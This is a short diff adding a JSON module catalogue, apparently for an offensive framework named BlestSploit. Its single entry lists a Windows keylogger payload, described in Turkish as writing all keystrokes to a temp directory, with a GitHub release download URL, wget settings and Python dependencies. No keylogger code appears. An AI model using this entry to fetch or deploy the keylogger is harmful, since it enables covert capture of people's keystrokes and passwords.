@@ -1,0 +1,20 @@
+{
+    "hepsi bir arada (Modüller/Tipler)": {
+        "1": {
+            "name": "Windows Keylogger",
+            "type": ["payload", "payloads"],
+            "author": "Fux Walker",
+            "filename": "keylogger-v.zip",
+            "ext_filename": "keylogger-v.py",
+            "description": "Tüm klavye girişlerini /Temp dizinine yazan basit bir keylogger",
+            "language": "python",
+            "version": "1.0",
+            "lookup_name": "Win64-Keylogger",
+            "url": "https://github.com/G00Dway/BlestSploit/releases/download/keylogger-1/keylogger-v.zip",
+            "download_manager": "wget",
+            "prefix": "-P",
+            "save_path": "/usr/share/blest-framework/files/cache",
+            "pip_depends": ["pynput", "pyinstaller"]
+        }
+    }
+}
